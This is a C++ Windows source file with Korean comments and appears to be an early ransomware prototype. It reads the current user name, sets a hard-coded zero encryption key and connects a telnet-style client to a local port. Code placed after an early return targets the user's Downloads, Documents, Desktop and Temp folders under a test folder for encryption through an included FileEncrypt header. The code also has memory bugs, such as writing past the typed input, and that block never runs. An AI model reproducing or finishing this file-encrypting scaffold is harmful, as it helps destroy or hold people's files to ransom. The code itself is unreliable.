#include <WinSock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>
#include <fstream>
#include <time.h>
#include <ctime>
#include "FileEncrypt.hpp"
#include "FileAnalysis.hpp"

#pragma comment(lib,"Ws2_32.lib")


using namespace std;

#define BUFFERSIZE 1024


void filebyte(const char* path)
{
    // 경로를 지정해서 파일을 바이너리모드로 열음 
    ifstream file(path, ios::binary);

    // 파일 검사 
    if (!file.is_open()) {
        cout << "파일을 열 수 없습니다." << endl;
        return;
    }

    // 버퍼를 만들어 4byte 읽기 
    char buffer[4] = { 0, };
    // 시그니처 출력하는 공간 
    file.read(buffer, 4);

    for (int i = 0; i < size(buffer); i++) {
        /*
            hex는 char형 으로 처리해야함
            unsigned char형은 16진수를 표현할 때 127 이상의 수를 표현 할 수 없기 때문에  -128 음수가 나오기 때문에 FFFFFF가 출력이 됨
        */
        cout << hex << ((unsigned int)(unsigned char)buffer[i]);
    }
    cout << endl;

    file.close();

}



char* print(vector<char>* str)
{
    // 포인트 위치
    int p = 0;
    // 버퍼 설정. +1은 \0를 넣기 위한 크기
    char out[BUFFERSIZE + 1];
    // return을 하기 위해서는 힙에 데이터를 선언 해야 한다.
    char* ret = new char[str->size() + 10];
    // 메모리 복사 "echo - "를 붙힌다.
    memcpy(ret, "echo - ", 7);
    // 콘솔 출력
    cout << "From Client message : ";
    // buffer사이지를 넘어서는 데이터일 경우 반복을 통해서 받는다.
    for (int n = 0; n < (str->size() / BUFFERSIZE) + 1; n++)
    {
        // 버퍼 사이즈 설정
        int size = str->size();
        // 수신 데이터가 버퍼 사이즈를 넘었을 경우.
        if (size > BUFFERSIZE) {
            if (str->size() < (n + 1) * BUFFERSIZE)
            {
                size = str->size() % BUFFERSIZE;
            }
            else
            {
                size = BUFFERSIZE;
            }
        }
        // echo 메시지와 콘솔 메시지를 작성한다.
        for (int i = 0; i < size; i++, p++)
        {
            out[i] = *(str->begin() + p);
            if (out[i] == '\0')
            {
                out[i] = ' ';
            }
            *(ret + p + 7) = out[i];
        }
        out[size] = '\0';
        // 콘솔 메시지 콘솔 출력.
        cout << out;
    }
    cout << endl;
    // 에코 메시지는 끝에 개행 + ">"를 넣는다.
    memcpy(ret + p + 7, "\n>\0", 3);
    return ret;
}




int main()
{
    
    DWORD username_len = UNLEN + 1;
    char userName[UNLEN + 1];
    string filename = "C:\\Users";
    string downloadname, documentsname, desktopname, foldername;

    // 사용자 이름 알아내기
    GetUserNameA(userName, &username_len);
    cout << "username: " << userName << endl;
    cout << endl;
    string userNameStr(userName);

    // 암호화 키 생성 
    unsigned char key[32] = {0x00,}; //generateKey();

    // 소켓 정보 데이터 설정
    WSADATA wsaData;
    // 소켓 실행.
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        return 1;
    }
    // Internet의 Stream 방식으로 소켓 생성 
    SOCKET sock = socket(PF_INET, SOCK_STREAM, 0);
    SOCKADDR_IN addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    // 127.0.0.1:8888로 접속
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr.s_addr);
    addr.sin_port = htons(8888);

    if (connect(sock, (SOCKADDR*)&addr, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
    {
        cout << "connect error" << endl;
        return 1;
    }
    // telent은 한글자씩 데이터가 오기 때문에 글자를 모을 buffer가 필요하다.
    vector<char> buffer;
    // 수신 데이터
    char x;
    while (1)
    {
        // 데이터를 받는다.
   
        if (recv(sock, &x, sizeof(char), 0) == SOCKET_ERROR)
        {
            cout << "error" << endl;
            break;
        }
        // 버퍼에 글자를 하나 넣는다.
        buffer.push_back(x);
        // \r\n>\0가 나오면 콘솔에 출력하고 콘솔로 부터 메시지를 기다린다.
        if (buffer.size() > 4 && *(buffer.end() - 4) == '\r' && *(buffer.end() - 3) == '\n' && *(buffer.end() - 2) == '>' && *(buffer.end() - 1) == '\0')
        {
            // 메시지 출력
            print(&buffer);
            // 버퍼 초기화
            buffer.clear();
            // 콘솔로 부터 입력을 받는다.
            char input[BUFFERSIZE];
            // 유저로 부터 입력 받기
            cin >> input;
            // 입력받은 길이를 받는다.
            int size = strlen(input);
            // 개행을 넣는다.
            *(input + size + 1) = '\r';
            *(input + size + 2) = '\n';
            // 서버로 보내기
            send(sock, input, size + 3, 0);
            // 메시지가 exit라면 종료
            if (*input == 'e' && *(input + 1) == 'x' && *(input + 2) == 'i' && *(input + 3) == 't')
            {
                break;
            }
            continue;
        }
    }
    // 서버 소켓 종료
    closesocket(sock);
    // 소켓 종료
    WSACleanup();
    return 0;







    // 디렉토리 탐색
    downloadname = filename + "\\" + userName + "\\test_folder" + "\\Downloads";
    documentsname = filename + "\\" + userName + "\\test_folder" + "\\Documents";
    desktopname = filename + "\\" + userName + "\\test_folder" + "\\Desktop";
    foldername = filename + "\\" + userName + "\\test_folder" + "\\AppData\\Local\\Temp";

    cout << downloadname << endl;
    cout << documentsname << endl;
    cout << desktopname << endl;
    cout << foldername << endl;
    cout << endl;
    cout << endl;

    // 파일 탐색
    FileRead(key, downloadname);
    FileRead(key, documentsname);
    FileRead(key, desktopname);
    FileRead(key, foldername);

    cryptoTest();

    return 0;
    

}
